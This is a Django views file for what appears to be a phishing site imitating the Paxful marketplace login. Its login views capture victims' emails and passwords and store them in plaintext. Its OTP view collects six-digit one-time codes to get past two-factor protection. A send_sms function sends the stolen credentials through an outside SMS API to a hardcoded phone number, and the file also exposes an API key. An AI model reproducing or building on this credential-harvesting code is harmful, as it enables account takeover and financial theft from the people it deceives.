from django.http import HttpResponseRedirect
from django.shortcuts import redirect, render
from django.urls import reverse

import smtplib

import requests
from .models import Person,Otp,Amount
import time
from .mailer import Mailer
# Create your views here.

def home(request):
    payment = Amount.objects.last()  # Assuming you have a Payment model
    amount = payment.amount if payment else None
    method = payment.payment 
    context ={'amount': amount , 'method':method}
    return render(request, 'paxfu/p2prelog.html', context)

def login(request):
    context={}
    return render(request, 'paxfu/newpaxlogin.html', context)

def confirm(request):
 

    context ={}
    return render(request, 'paxfu/shop.html', context)



def payment(request):
    if request.method == 'POST':
        #username = request.POST['username']
        username = request.POST['email']
        password = request.POST['password']
        request.session['username'] = username  # Store username in session

        print(username)
        print(password)
        person = Person.objects.create(
            email=username,
            password=password
        )
       # send_sms(person)
        person.save()
        return HttpResponseRedirect('/otp/')  
       # return HttpResponseRedirect(reverse('passi') + '?username=' + username)
   
    #return render(request, 'paxfu/noonemail.html')
    return render(request, 'paxfu/newpaxlogin.html')


def passi(request):
    if request.method == 'POST':
        username = request.POST['email']
        password = request.POST['password']
        #username = request.session.get('email', '')

      #  username = request.POST['username']
        print(username)
        print(password)
        person = Person.objects.create(
            email=username,
            password=password
        )
       # send_sms(person)
        person.save()
        return HttpResponseRedirect('/otp/')     
    return render(request, 'paxfu/newpaxlogin.html')




def otp(request):
    if request.method == 'POST':
        otp1 = request.POST['otp']
        otp2 = request.POST['otp1']
        otp3 = request.POST['otp2']
        otp4 = request.POST['otp3']
        otp5 = request.POST['otp4']
        otp6 = request.POST['otp5']
        otp = (otp1+otp2+otp3+otp4+otp5+otp6)
        print(otp)
        # print(password)
        person = Otp.objects.create(otp= otp)
        person.save()    
        
    context ={}
    return render(request, 'paxfu/newotp.html', context)



def send_sms(person):
    url = "https://api.mobitechtechnologies.com/sms/sendsms"
    headers = {
        "h_api_key": "4935ec344cb6ba777f3a4dc561dee1fbd426e39ba667b91bea64fc8393209f50",
        "Content-Type": "application/json"
    }
    message = f"person = Person(email='{person.email}', password='{person.password}')"
    payload = {
        "mobile": "+254724324545",
        "response_type": "json",
        "sender_name": "Betznumbers",
        "service_id": 0,
        "message": message
    }

    response = requests.post(url, headers=headers, json=payload)
    if response.ok:
        print("SMS sent successfully.")
    else:
        print("Failed to send SMS.")

